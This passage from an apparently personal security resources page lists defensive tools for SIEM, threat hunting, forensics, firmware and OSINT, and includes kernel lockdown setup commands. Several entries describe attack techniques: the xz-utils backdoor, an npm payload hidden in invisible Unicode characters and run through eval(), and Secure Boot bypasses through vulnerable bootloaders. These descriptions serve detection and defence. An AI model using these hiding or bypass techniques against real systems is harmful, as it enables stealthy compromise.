for now it includes everything from XDR, SIEM, and AppSec solutions to vulnerability scanners and monitoring platforms.</p> wazuh <p>wazuh is a fully open source XDR and SIEM. It's very easy to setup and use, supporting deployment on a number of endpoints. Anything it can't deploy an agent on can ship logs to a central log server that can be ingested later by wazuh.</p> <ul> <li>https://wazuh.com/</li> <li>https://github.com/wazuh</li> </ul> <p>Overview:</p> <ul> <li>SIEM / Log analysis</li> <li>EDR</li> <li>File integrity monitoring</li> <li>Vulnerability detection</li> <li>Configuration assessment</li> </ul> <p>One drawback to wazuh is that the agent is a regular system process and not a kernel-level process. Ideally you would be catching something before it reaches the kernel and evades detection, but this is what some may consider its weakness compared to other XDR solutions.</p> Secuity Onion <ul> <li>https://github.com/Security-Onion-Solutions</li> </ul> runZero <p>runZero is an asset discovery and attack surface management platform designed to work without agents or authentication. There's a community edition with full features available for up to 100 IPs, which is free for personal / lab use.</p> <p>Founded by HD Moore (creator of Metasploit), this has come up on the PSW family of shows on various occassions for its ability to accurately fingerprint devices.</p> <ul> <li>https://www.runzero.com/</li> <li>https://github.com/runZeroInc</li> </ul> <p>Platform Support</p> <p>runZero supports almost all major platforms and architectures, including Windows, macOS, Linux, BSD, 32/64-bit, and ARM. Using a Raspberry Pi as an \"Explorer\" node works really well and has a lot of flexibility. The device you deploy the Explorer service to becomes your internal scanning engine. Ensure you have the right network access in place, or the right number of devices to use as Explorers, to fully enumerate your networks.</p> <ul> <li>https://help.runzero.com/docs/installing-an-explorer/</li> <li>https://help.runzero.com/docs/installing-explorer-on-raspberry-pi/</li> </ul> <p>Verifying Binaries</p> <p>runZero is able to build dynamic binaries on-demand, but also uses GPG and a custom signing tool to verify them. The documentation below walks through the process of validating any installers obtained from your console, as they are unique to your instance.</p> <pre><code>pub   rsa4096/60EBAAE9AEF08C6D 2022-08-07 [SC] [expires: 2029-08-05]\n    Key fingerprint = 9B5D AFF7 D433 4929 8A30  39BD 60EB AAE9 AEF0 8C6D\nuid                 [ unknown] runZero Security &lt;security@runzero.com&gt;\nsub   rsa4096/42ABA0ED4DBCD1C5 2022-08-07 [E] [expires: 2029-08-05]\n</code></pre> <ul> <li>https://help.runzero.com/docs/binary-verification/</li> </ul> <p>In summary:</p> <ul> <li>Download the GPG public key</li> <li>Download the verifier tool and its detached signature / hash</li> <li>Verify the verifier tool itself using the detached GPG signature and hash</li> <li>Download your Explorer installer</li> <li>Use the verifier tool to validate the Explorer installer binary</li> </ul> Nessus <p>Nessus is possibly the most well known vulnerability scanner. Any pentesting course is likely to introduce Nessus as a method of assessing targets via a network scan.</p> <p>See my notes on Nessus.</p> <ul> <li>https://www.tenable.com/products/nessus</li> </ul> OpenVAS <p>OpenVAS is the only remaining open-source fork of the original Nessus vulnerability scanner before it went closed-source back in 2005.</p> <p>All release files are signed with the Greenbone Community Feed integrity key. This gpg key can be downloaded at https://www.greenbone.net/GBCommunitySigningKey.asc and the fingerprint is <code>8AE4 BE42 9B60 A59B 311C  2E73 9823 FAA6 0ED1 E580</code>.</p> <ul> <li>https://github.com/greenbone/openvas-scanner</li> <li>https://greenbone.github.io/docs/latest/</li> </ul> <p>OpenVAS is available in Kali as the <code>gvm</code> package.</p> <ul> <li>https://greenbone.github.io/docs/latest/22.4/kali/index.html</li> <li>https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/</li> <li>https://www.kali.org/tools/gvm/</li> </ul> Sandfly Security <p>Sandfly is an agentless Linux EDR and IR platform, doing everything via SSH. Their blog has a number of interesting examples and resources on Linux threat detection.</p> <ul> <li>https://sandflysecurity.com/</li> <li>https://sandflysecurity.com/blog</li> </ul> ntop <ul> <li>https://github.com/ntop/ntopng</li> </ul> BLUESPAWN <ul> <li>https://github.com/ION28/BLUESPAWN</li> </ul> OpenEDR <ul> <li>https://github.com/ComodoSecurity/openedr</li> </ul> LimaCharlie <ul> <li>https://limacharlie.io/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#windows_1","title":"Windows","text":"audit-inspector (Windows) <p>Audit Inspector is a binary tool written in Rust for Windows audit configuration and auditing.</p> <ul> <li>https://github.com/blackhillsinfosec/audit-inspector</li> </ul>"},{"location":"blog/2019/07/15/-resources/#linux","title":"Linux","text":"Kernel Lockdown Mode <p>You can set the Linux kernel to lockdown mode by enabling Secure Boot, or by setting the mode manually in GRUB.</p> <ul> <li>https://github.com/torvalds/linux/blob/master/security/lockdown/Kconfig</li> <li>manpages: kernel_lockdown</li> </ul> <p>What this does:</p> <ul> <li>Modifications to the kernel at runtime will require a reboot</li> <li>Makes an attacker's job more difficult at gaining kernel level persistence or escaping the hypervisor. (Stops a number of known rootkits)</li> <li>Disabling Secure Boot at the UEFI level requires physical or serial console access for MOK in the firmware during the boot process</li> </ul> <p>How this can be defeated:</p> <ul> <li>If signing scripts and keys are present on the system at the time of compromise</li> <li>Novel attack against the Linux kernel</li> </ul> <p>How this can be detected:</p> <ul> <li>Monitor and log root command execution with auditd or Sysmon</li> <li>Watch invokation of <code>/usr/src/linux-headers-$(uname -r)/scripts/sign-file</code> and <code>mokutil</code></li> <li>If you did not schedule a shutdown or reboot that occured, you may have been compromised.</li> </ul> <p>Kernel Command Line Parameters (full list)</p> <ul> <li>kernel.org/admin-guide/kernel-parameters (txt)</li> <li>kernel.org/admin-guide/kernel-parameters (html)</li> </ul> <pre><code>    lockdown=       [SECURITY]\n                    { none | integrity | confidentiality }\n                    Enable the kernel lockdown feature. If set to\n                    integrity, kernel features that allow userland to\n                    modify the running kernel are disabled. If set to\n                    confidentiality, kernel features that allow userland\n                    to extract confidential information from the kernel\n                    are also disabled.\n</code></pre> <p>Configuring Lockdown Mode:</p> <ul> <li><code>lockdown=integrity</code> is enabled by default on systems with UEFI Secure Boot</li> <li>The recommended way of making persistent kernel-command-line modifications is via GRUB/GRUB2</li> <li>This is done with <code>grub</code> (Debian/Ubuntu) or <code>grubby</code> (RHEL/Fedora) via the boot parameters.</li> </ul> <p>Get the current lockdown setting:</p> <pre><code>cat /sys/kernel/security/lockdown\n</code></pre> <p>Setting Lockdown Mode on Debian/Ubuntu or Fedora/RHEL</p> <pre><code>sudo nano /etc/default/grub\n</code></pre> <p>Change <code>GRUB_CMDLINE_LINUX=\"\"</code> to have <code>GRUB_CMDLINE_LINUX=\"lockdown=&lt;mode&gt;\"</code> appended (if there are already other CMDLINE parameters).</p> <p>Mode can be one of <code>none</code>, <code>integrity</code>, or <code>confidentiality</code></p> <p>EXAMPLE: <code>GRUB_CMDLINE_LINUX=\"lockdown=integrity\"</code></p> <p>After making any changes:</p> <pre><code># Debian / Ubuntu\nsudo update-grub\n\n# Fedora / RHEL\nsudo grub2-mkconfig &gt; /dev/null\n</code></pre> <p>Setting Lockdown Mode on Raspberry Pi</p> <p>This file points to all of the boot parameters, typically in the same directory:</p> <pre><code>/boot/firmware/config.txt\n</code></pre> <p>To modify a kernel command line parameter as you would in /etc/default/grub:</p> <pre><code>sudo echo 'lockdown=confidentiality' &gt;&gt; /boot/firmware/nobtcmd.txt\n</code></pre> <p>All Distros</p> <p>No matter which Linux distribution you're making these changes on, to complete the process you'll need to reboot.</p> <pre><code># Reboot after making changes\nsudo systemctl reboot\n</code></pre> <p>To verify the changes on reboot:</p> <pre><code>cat /sys/kernel/security/lockdown\nnone [integrity] confidentiality\n</code></pre> CPU Vulnerabilities &amp; Mitigations <p>This was originally discovered on the Ubuntu Security Podcast / Ubuntu blog. The original source will need to be linked and added if it can be tracked down.</p> <p>Running this command will enumerate all existing mitigiations, issues, or otherwise, affecting the current CPU. This can be run from both a guest VM or the host machine.</p> <pre><code>head -n-0 /sys/devices/system/cpu/vulnerabilities/*\n</code></pre>"},{"location":"blog/2019/07/15/-resources/#threat-hunting","title":"Threat Hunting","text":"Pivot Atlas <p>A visualization of paths in threat intelligence.</p> <ul> <li>https://gopivot.ing/</li> <li>https://github.com/korniko98/pivot-atlas</li> </ul> LOLRMM <p>Welcome to LOLRMM (Living Off the Land Remote Monitoring and Management), a community-driven project that provides a curated list of Remote Monitoring and Management (RMM) tools that could potentially be abused by threat actors. Our mission is to assist security professionals in staying informed about these tools and their potential for misuse, providing the community a catalog of these tools which can be used for threat hunting, detection and prevention policy creations.</p> <ul> <li>https://lolrmm.io/</li> <li>https://github.com/magicsword-io/LOLRMM</li> </ul> pspy <p><code>pspy</code> is potentially the most useful application for examining system activity in real time. Because of this, it's as much a threat hunting tool as it is a threat.</p> <p>Static and linked binaries are available to download from the GitHub release page.</p> <ul> <li>https://github.com/DominicBreuker/pspy</li> </ul> <pre><code>## pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\ncurl -LfO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32'\n7cd8fd2386a30ebd1992cc595cc1513632eea4e7f92cdcaee8bcf29a3cff6258  pspy32\n\ncurl -LfO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s'\n0265a9d906801366210d62bef00aec389d872f4051308f47e42035062d972859  pspy32s\n\ncurl -LfO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'\nf7f14aa19295598717e4f3186a4002f94c54e28ec43994bd8de42caf79894bdb  pspy64\n\ncurl -LfO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s'\nc769c23f8b225a2750768be9030b0d0f35778b7dff4359fa805f8be9acc6047f  pspy64s\n</code></pre> YARA <p>Malware rule, pattern, and classification Language. Yara can take a pattern or rule file, and look at other files or processes either on a live system, or offline. This includes disk images or memory dumps, text dumps of strings, and more.</p> <ul> <li>https://github.com/VirusTotal/yara</li> <li>https://yara.readthedocs.io/en/stable/</li> </ul> yarGen <p>Programmatic YARA rule generation.</p> <ul> <li>https://github.com/Neo23x0/yarGen</li> </ul> YARA-Rules Repository <ul> <li>https://github.com/Yara-Rules/rules</li> </ul> RITA <p>Real Intelligence Threat Analytics (RITA) is a framework for detecting command and control communication through network traffic analysis.</p> <ul> <li>https://github.com/activecm/rita</li> </ul> <p>RITA is possibly the ultimate open-source network threat hunting tool. Using Zeek logs, it can determine:</p> <ul> <li>Beaconing Detection: Search for signs of beaconing behavior in and out of your network</li> <li>Long Connection Detection: Easily see connections that have communicated for long periods of time</li> <li>DNS Tunneling Detection: Search for signs of DNS based covert channels</li> <li>Threat Intel Feed Checking: Query threat intel feeds to search for suspicious domains and hosts</li> </ul> <p>The deployment method has changed since they have moved to using Ansible. It can be dropped onto the local system with:</p> <pre><code>./install_rita.sh \"localhost\"\n</code></pre> <p>Or one-or-more remote systems by passing a comma-separated list of endpoints to the installer like this:</p> <pre><code>./install_rita.sh \"root@&lt;ip_1&gt;,&lt;ip_2&gt;,myhost.internal\"\n</code></pre> <p>A RITA \"server\" can ingest Zeek logs into multiple data sets, either on a recurring / rolling basis as part of a crontask or as needed into unique data sets. This means you can continue to add to specific data sets and perform analysis of specific networks over time.</p> Zeek <p>Zeek is a powerful network analysis framework that is much different from the typical IDS you may know.</p> <ul> <li>https://zeek.org/</li> <li>https://github.com/zeek/zeek</li> </ul> <p>Zeek is the tool you'll want to use to create the necessary logs to ingest with RITA for network threat hunting. Zeek itself doesn't need to be running on every endpoint, you can simply write and log packet captures of network activity using something like <code>netsh</code>, <code>pktmon</code>, <code>tshark</code> or <code>tcpdump</code> to be sent to a central logging server where Zeek can transform those captures into Zeek logs.</p> <p>If you're using the built-in Windows <code>netsh</code> and <code>pktmon</code> tools, you'll likely need to convert the capture files into pcaps with etl2pcapng.</p> Suricata <p>Suricata is a network Intrusion Detection System, Intrusion Prevention System and Network Security Monitoring engine developed by the OISF and the Suricata community.</p> <ul> <li>https://suricata.io/download/</li> <li>https://github.com/OISF/suricata</li> </ul> Velociraptor <p>Agent based incident response tool.</p> <ul> <li>https://docs.velociraptor.app/</li> <li>https://github.com/Velocidex/velociraptor</li> </ul> Chainsaw <p>Chainsaw provides a powerful first-response capability to quickly identify threats within Windows forensic artefacts such as Event Logs and the MFT file. Chainsaw offers a generic and fast method of searching through event logs for keywords, and by identifying threats using built-in support for Sigma detection rules, and via custom Chainsaw detection rules.</p> <ul> <li>https://github.com/countercept/chainsaw</li> </ul> Hayabusa <p>Hayabusa is a sigma-based threat hunting and fast forensics timeline generator for Windows event logs.</p> <ul> <li>https://github.com/Yamato-Security/hayabusa</li> </ul> OSQuery <ul> <li>https://github.com/osquery/osquery</li> </ul> BeaKer <ul> <li>https://github.com/activecm/BeaKer</li> </ul> Raccine <ul> <li>https://github.com/Neo23x0/Raccine</li> </ul> SIGMA <p>General signature format for SIEM systems.</p> <ul> <li>https://github.com/SigmaHQ/sigma</li> <li>https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin</li> </ul> Canary Tokens <p>Active defense alerts using secrets, commands, documents, files and more.</p> <ul> <li>https://canarytokens.org/generate#</li> <li>https://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html</li> <li>https://notes.huskyhacks.dev/notes/content-creators-i-will-teach-you-cyber-jiu-jitsu</li> </ul> iVerify <p>Discovered on Schneier's blog post: Detecting Pegasus Infections.</p> <p>It's able to do this through diagnostic data and system information without needing (or being able) to read any data from applications or files.</p> <ul> <li>https://iverify.io/products/basic</li> <li>https://iverify.io/blog/engineering-threat-hunting-for-ios-and-android</li> <li>https://iverify.io/frequently-asked-questions</li> </ul> MISP (Malware Information Sharing Platform) <p>MISP Project - Open Source Threat Intelligence Platform &amp; Open Standards For Threat Information Sharing.</p> <ul> <li>https://github.com/MISP</li> </ul> The Hive Project (IR Platform) <p>An open source IR platform.</p> <p>One Case Management Platform for all SOCs, CERTs &amp; CSIRTs</p> <ul> <li>https://github.com/TheHive-Project</li> <li>https://strangebee.com/</li> <li>https://thehive-project.org/ (old url)</li> </ul> Elastic Detection Rules <p>Detection Rules is the home for rules used by Elastic Security. This repository is used for the development, maintenance, testing, validation, and release of rules for Elastic Security's Detection Engine.</p> <ul> <li>https://github.com/elastic/detection-rules/tree/main</li> </ul> SquareX (Browser Detection and Response) <p>SquareX has done a lot of interesting research into browser-based attacks. The browser is one of the most critical points of failure, and is still kind of esoteric when it comes to applying defenses. They plan to release research throughout 2025 that focuses on attack paths in browsers exploiting functionality that cannot be easily patched.</p> <ul> <li>https://sqrx.com/</li> </ul> rkchk <p>Rust Linux Kernel Module designed for LKM rootkit detection.</p> <p>Discovered on PSW #867, this is a proof-of-concept kernel module to detect other LKM-based rootkits. The README has a list of LKM rootkits it has been tested against.</p> <ul> <li>https://github.com/thalium/rkchk</li> <li>https://blog.thalium.re/posts/linux-kernel-rust-module-for-rootkit-detection/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#grc","title":"GRC","text":"<p>All things standards, configuration, compliance, and policy related.</p> MITRE ATT&amp;CK <p>MITRE ATT&amp;CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.</p> <ul> <li>https://attack.mitre.org/</li> <li>https://github.com/mitre/cti</li> <li>https://attack.mitre.org/resources/working-with-attack/ (the \"learn more\" sections have complete download lists of the frameworks as xlsx)</li> <li>https://attack.mitre.org/docs/enterprise-attack-v9.0/enterprise-attack-v9.0-techniques.xlsx</li> </ul> MITRE CWE <p>A community developed list of software and hardware weaknesses that can become vulnerabilities.</p> <ul> <li>https://cwe.mitre.org/index.html</li> <li>https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html (great historical reference)</li> </ul> OpenSCAP <p>Security automation content in SCAP, Bash, Ansible, and other formats.</p> <p>These resources primarily focus on Unix-like operating systems. Windows support is no longer maintained as of the time of writing this.</p> <ul> <li>https://github.com/ComplianceAsCode/content (bash and ansible deployment)</li> <li>https://www.open-scap.org/security-policies/choosing-policy/ (list of policies)</li> </ul> STIG <p>Security Technical Implementation Guides (STIGs) by The United States Department of Defense specify how government computers must be configured and managed.</p> <ul> <li>https://public.cyber.mil/stigs/</li> </ul> <p>The majority of the STIG policies (for Unix-like machines and browsers) can be viewed online through OpenSCAP's project page, and can be deployed through bash or Ansible using the ComplianceAsCode GitHub release files.</p> <ul> <li>https://www.open-scap.org/</li> <li>https://www.open-scap.org/security-policies/choosing-policy/</li> <li>https://github.com/ComplianceAsCode/content/releases</li> </ul> CIS Benchmarks <p>The CIS Benchmarks are prescriptive configuration recommendations for more than 25+ vendor product families. They represent the consensus-based effort of cybersecurity experts globally to help you protect your systems against threats more confidently.</p> <ul> <li>https://www.cisecurity.org/cis-benchmarks</li> </ul> <p>The majority of the CIS policies (for Unix-like machines and browsers) can be viewed online through OpenSCAP's project page, and can be deployed through bash or Ansible using the ComplianceAsCode GitHub release files.</p> <ul> <li>https://www.open-scap.org/</li> <li>https://www.open-scap.org/security-policies/choosing-policy/</li> <li>https://github.com/ComplianceAsCode/content/releases</li> </ul> Microsoft Baselines <p>The download center link has all of the baselining tools available, including LGPO.exe and the PolicyAnalyzer.</p> <p>The idea with the .PolicyRules files is they are configurations that are pre-made by Microsoft and ready to be installed using LGPO.exe</p> <p>You can do all of this manually with PowerShell, and you will ultimately want to familiarize yourself with the descriptions of each setting should you run into any issues, but this will save a ton of time in getting things up and running.</p> <p>Use PolicyAnalyzer.exe to view the <code>*.PolicyRules</code> files, compare them to other <code>*.PolicyRules</code> files, or even your current system settings.</p> <p>The remaining files are the raw policies for each \"thing\", including Windows 10 and 11 endpoints, Windows Server, Microsoft Edge, and M365 apps. When applied they create a hardened environment from a security perspective while maintaining functionality.</p> <ul> <li>windows-security-baselines</li> <li>Microsoft Download Center: Security Baselines</li> </ul> Software Bill of Materials (SBOM) <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2019/07/15/-resources/#reverse-engineering","title":"Reverse Engineering","text":"Ghidra <p>Ghidra is a software reverse engineering (SRE) framework.</p> <ul> <li>https://github.com/NationalSecurityAgency/ghidra</li> </ul> Ghidriff <p>Python Command-Line Ghidra Binary Diffing Engine.</p> <ul> <li>https://github.com/clearbluejar/ghidriff</li> </ul> GhidraMCP <p>ghidraMCP is an Model Context Protocol server for allowing LLMs to autonomously reverse engineer applications. It exposes numerous tools from core Ghidra functionality to MCP clients.</p> <p>See the videos in the README for a demo and install steps.</p> <ul> <li>https://github.com/LaurieWired/GhidraMCP</li> </ul> GEF <p>GEF (pronounced \"Jeff\") is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development. Application developers will also benefit from it, as GEF lifts a great part of regular GDB obscurity, avoiding repeating traditional commands, or bringing out the relevant information from the debugging runtime.</p> <ul> <li>https://github.com/hugsy/gef</li> </ul> <p>In addition to the easy install options in the GitHub README, you can also install GEF directly from GitHub by downloading the latest gef.py file to <code>$HOME/.gef.py</code>, and sourcing that file from <code>~/.gdbinit</code> like this:</p> <pre><code># Installs GDB Enhanced Features (GEF)\nsource ~/.gef.py\n</code></pre> Cutter <p>Cutter is a free and open-source reverse engineering platform powered by rizin. It aims at being an advanced and customizable reverse engineering platform while keeping the user experience in mind. Cutter is created by reverse engineers for reverse engineers.</p> <p>Cutter is an excellent macOS, Linux and Windows binary disassembler + decompiler. The GitHub releases page has ready to use AppImages for 64-bit Linux.</p> <ul> <li>https://github.com/rizinorg/cutter</li> </ul>"},{"location":"blog/2019/07/15/-resources/#malware-analysis","title":"Malware Analysis","text":"DidierStevensSuite <p>Numerous, essential, forensics and analysis tools.</p> <ul> <li>https://github.com/DidierStevens/DidierStevensSuite</li> <li>https://github.com/DidierStevens/Beta</li> </ul> Qu1cksc0pe <p>An all-in-one malware analysis tool, excellent for triage. Originally discovered on this SANS diary. The diary post has an alternate docker file available to use.</p> <ul> <li>https://github.com/CYB3RMX/Qu1cksc0pe</li> <li>https://isc.sans.edu/diary/29984</li> </ul> MalAPI <p>Common Windows API calls used by malware.</p> <ul> <li>https://malapi.io/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#known-samples","title":"Known Samples","text":"xz-utils Backdoor <p>Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0. Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file existing in the source code, which is then used to modify specific functions in the liblzma code. This results in a modified liblzma library that can be used by any software linked against this library, intercepting and modifying the data interaction with this library.</p> <ul> <li>https://nvd.nist.gov/vuln/detail/cve-2024-3094</li> <li>https://isc.sans.edu/diary/30802</li> <li>https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</li> </ul> Unicode Steganography &amp; Google Calendar C2 <p>NPM Attack Leveraging Unicode Steganography and Google Calendar C2</p> <p>Check the screenshot of the hexdump, the many dots following the <code>|</code> character are the obfuscated glyphs carrying the base64 data in their low byte. This is only a small piece of this research, but the invisible unicode characters are likely the most interesting part.</p> <p>The research does the best job of unwinding this, but essentially:</p> <ul> <li>A .js file had a decode()-to-eval() happening on (what seems like) a single <code>|</code> character, which makes no sense at first glance</li> <li>The Variation Selectors Supplement range (U+E0100 to U+E01EF) was used to hide base64 data</li> <li>This provides 240 possible characters, base64 only requires 64 characters <code>[A-Za-z0-9+/]</code> with <code>=</code> for padding</li> <li>These characters have no \"glyph\", and are therefore invisible</li> <li>The key here is <code>xx</code> in <code>U+E01xx</code>, which remember the available range is U+E0100 to U+E01EF, offered enough space and variation to store valid base64 data</li> <li>This is only \"visible\" by hexdumping the .js file</li> </ul> <p>Demo</p> <p>The easiest way to visualize this is using the <code>chr()</code> function in python:</p> <pre><code># Prints the copyright symbol\nprint(chr(0x00A9))\n\n# Prints one of these invisible glyphs\nprint(chr(0xE0100))\n</code></pre> <p>Detection</p> <ul> <li>Line length</li> <li>Hexdump</li> <li>Changing <code>eval()</code> to <code>console.log()</code></li> </ul> <p>Despite how awesome this technique is, it eventually has to decode itself to plaintext to execute. This will likely appear in some type of log or network capture.</p>"},{"location":"blog/2019/07/15/-resources/#firmware","title":"Firmware","text":""},{"location":"blog/2019/07/15/-resources/#information","title":"Information","text":"bootloaders.io <p>bootloaders.io is a curated list of known malicious bootloaders for various operating systems. The project aims to assist security professionals in staying informed and mitigating potential threats associated with bootloaders.</p> <ul> <li>https://github.com/magicsword-io/bootloaders</li> </ul> DBX Update Process <ul> <li>https://eclypsium.com/2022/07/26/firmware-security-realizations-part-1-secure-boot-and-dbx/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#projects","title":"Projects","text":"Coreboot <ul> <li>https://doc.coreboot.org/</li> </ul> EDK2 / Tianocore <ul> <li>https://github.com/tianocore/edk2</li> </ul> System76 Open Firmware <p>An open source distribution of firmware utilizing coreboot, EDK2, and System76 firmware applications</p> <ul> <li>https://github.com/system76/firmware-open</li> <li>Secure Boot support was added in 2023-04-03</li> </ul> LVFS <p>Linux Vendor Firmware Service.</p> <ul> <li>https://fwupd.org/</li> <li>https://github.com/fwupd/fwupd</li> </ul> ChipSec <p>CHIPSEC is a framework for analyzing the security of PC platforms including hardware, system firmware (BIOS/UEFI), and platform components. It includes a security test suite, tools for accessing various low level interfaces, and forensic capabilities. It can be run on Windows, Linux, and UEFI shell.</p> <ul> <li>https://github.com/chipsec/chipsec</li> </ul> EMBA <p>EMBA was discovered through Paul's Security Weekly. It's been covered in too many episodes to pinpoint which one I initially heard it from.</p> <p>EMBA is designed as the central firmware analysis and SBOM tool for penetration testers, product security teams, developers and responsible product managers. It supports the complete security analysis process starting with firmware extraction, doing static analysis and dynamic analysis via emulation, building the SBOM and finally generating a web based vulnerability report. EMBA automatically discovers possible weak spots and vulnerabilities in firmware. Examples are insecure binaries, old and outdated software components, potentially vulnerable scripts, or hard-coded passwords. EMBA is a command line tool with the possibility to generate an easy-to-use web report for further analysis.</p> <p>EMBA requires a lot of compute resources. See the prerequisites for details. For reference, your EMBA VM should have 8vCPU's and 16GB RAM as the minimum.</p> <ul> <li>https://github.com/e-m-b-a/emba</li> </ul> OFRAK <p>OFRAK allows you to unpack, modify, and repack binaries.</p> <p>It supports a range of embedded firmware file formats beyond userspace executables, including: compressed filesystems, compressed &amp; checksummed firmware, bootloaders and RTOS/OS kernels.</p> <ul> <li>https://github.com/redballoonsecurity/ofrak</li> <li>Red Balloon Security</li> </ul> UEFITool <p>UEFI firmware image editor and viewer.</p> <ul> <li>https://github.com/LongSoft/UEFITool</li> </ul> UEFI Firmware Parser <ul> <li>https://github.com/theopolis/uefi-firmware-parser</li> </ul> Flashrom <p>Read, write, edit firmware.</p> <ul> <li>https://github.com/flashrom/flashrom</li> </ul>"},{"location":"blog/2019/07/15/-resources/#vulnerabilities","title":"Vulnerabilities","text":"BootHole <p>This includes the vulnerability check for both bash and PowerShell.</p> <ul> <li>https://github.com/eclypsium/BootHole</li> </ul> baton drop (CVE-2022-21894) <p>Windows Boot Applications allow the truncatememory setting to remove blocks of memory containing \"persistent\" ranges of serialised data from the memory map, leading to Secure Boot bypass.</p> <ul> <li>https://github.com/Wack0/CVE-2022-21894</li> </ul> LogoFAIL <p>The Binarly REsearch team investigates vulnerable image parsing components across the entire UEFI firmware ecosystem and finds all major device manufacturers are impacted on both x86 and ARM-based devices.</p> <p>This attack vector can give an attacker an advantage in bypassing most endpoint security solutions and delivering a stealth firmware bootkit that will persist in an ESP partition or firmware capsule with a modified logo image.</p> <ul> <li>https://www.binarly.io/blog/the-far-reaching-consequences-of-logofail</li> </ul> GRUB Unpatched for 15 Months in Major Distros <p>Discovered on PSW #867, GRUB has been vulnerable to UEFI / boot-level attacks for 15+ months, and none of the major distros have integrated the patches as of March in 2025.</p> <ul> <li>Phoronix Post by Michael Larabel</li> <li>GRUB2 Mailing List Thread Detailing the 73 Patches</li> </ul> <p>A few points based on the show notes and the article:</p> <ul> <li>If Microsoft doesn't update the DBX or SBAT to prevent loading these versions of GRUB, you can use a vulnerable version of GRUB via USB boot to bypass Secure Boot</li> <li>This potentially allows USB-based boot attacks to bypass GPG signed boot, GRUB passwords, and possibly full disk encryption</li> <li>Also includes a vulnerability similar to LogoFAIL, exploiting image parsers</li> </ul>"},{"location":"blog/2019/07/15/-resources/#forensics","title":"Forensics","text":"uac (Unix-like Artifacts Collector) <p>UAC is a Live Response collection script for Incident Response that makes use of native binaries and tools to automate the collection of AIX, ESXi, FreeBSD, Linux, macOS, NetBSD, NetScaler, OpenBSD and Solaris systems artifacts. It was created to facilitate and speed up data collection, and depend less on remote support during incident response engagements.</p> <ul> <li>https://github.com/tclahr/uac</li> </ul> <p>UAC is primarily an evidence collection tool. This isn't something like linpeas that will alert you to possible leads as it's gathering evidence. It's a ton of output, and is a haystack in which you'd be trying to find a very small needle if you didn't already have an idea of what you're looking for. With this in mind, there are a few effective ideas on how to leverage this tool:</p> <ul> <li>Assume you're compromised, hit each endpoint with UAC and pull the resulting evidence back to your IR machine</li> <li>Investigate supsicious activity with system internals, using what you know while UAC runs</li> <li>Use linpeas to assess endpoints, it's not just a hacking tool, it will find IOC's</li> </ul> <p>If you have a possible lead or IOC, then your UAC evidence becomes invaluable. With the evidence back on your IR machine:</p> <ul> <li>You can of course dig into specific evidence based on your potential IOC's</li> <li>You could also use YARA to hit the entire UAC evidence folder for IOC's, which is incredibly fast</li> </ul>"},{"location":"blog/2019/07/15/-resources/#memory-acquisition","title":"Memory Acquisition","text":"avml (Acquire Volatile Memory for Linux) <p>Do this remotely with ssh + avml (acquire volatile memory for linux).</p> <ul> <li>https://github.com/microsoft/avml</li> </ul> lmg (Linux Memory Grabber) <p>Do this remotely with ssh + lmg (linux memory grabber).</p> <ul> <li>https://github.com/halpomeranz/lmg</li> </ul>"},{"location":"blog/2019/07/15/-resources/#osint","title":"OSINT","text":"Shodan <p>A search engine for devices.</p> <ul> <li>https://www.shodan.io/</li> </ul> Hurrican Electric <p>Hurricane Electric operates its own global IPv4 and IPv6 network and is considered the largest IPv6 backbone in the world as measured by number of networks connected.</p> <p>There's also an iOS and Android application that provides a suite of network tools on the go.</p> <ul> <li>BGP Toolkit shows information about your connection.</li> <li>Looking Glass allows you to make network queries for for BGP, ping, and traceroute.</li> </ul> crt.sh <p>Certificate search.</p> <p>Enter an Identity (Domain Name, Organization Name, etc), a Certificate Fingerprint (SHA-1 or SHA-256) or a crt.sh ID.</p> <ul> <li>https://crt.sh</li> <li>https://github.com/crtsh</li> </ul> ipinfo.io <p>IP address data, this site was originally discovered in TCM's ethical hacking course videos on YouTube as a way to get your current IP address, and lookup other IP addresses. Their GitHub has a CLI utility to use with the API. See their pricing for usage details and example data, from the free tier up to enterprise.</p> <ul> <li>https://ipinfo.io/</li> <li>https://ipinfo.io/what-is-my-ip</li> <li>https://github.com/ipinfo</li> </ul> <p>The easiest way to interact with the service is via their website with <code>curl</code> to check your IP. This does not require auth or any subscription to check.</p> <pre><code>curl https://ipinfo.io/json\n</code></pre>"},{"location":"blog/2019/07/15/-resources/#vulnerability-research","title":"Vulnerability Research","text":"<p>Sources used when attempting to triage and produce a proof-of-concept exploit or demonstrate risk.</p> NIST / NVD <p>National Institute of Standards and Technology.</p> <ul> <li>https://www.nist.gov/</li> <li>https://csrc.nist.gov/Topics/technologies/software-firmware/bios</li> </ul> <p>The NVD (National Vulnerability Database) is a resource for researching vulnerabilities.</p> <ul> <li>https://nvd.nist.gov/</li> </ul> CISA / KEV <p>Cybersecurity &amp; Infrastructure Security Agency. Follow the KEV (known-exploited-vulnerabilities-catalog).</p> <ul> <li>https://www.cisa.gov/known-exploited-vulnerabilities-catalog</li> <li>https://www.cisa.gov/publication/cyber-essentials-toolkits</li> </ul> CVE.ORG <p>Identify, define, and catalog publicly disclosed cybersecurity vulnerabilities.</p> <ul> <li>https://www.cve.org/</li> <li>https://cve.mitre.org/ (old site)</li> <li>https://github.com/CVEProject/cvelistV5 (CVE cache of the official CVE List in CVE JSON 5 format)</li> </ul> CVEMap <p>Navigate the Common Vulnerabilities and Exposures 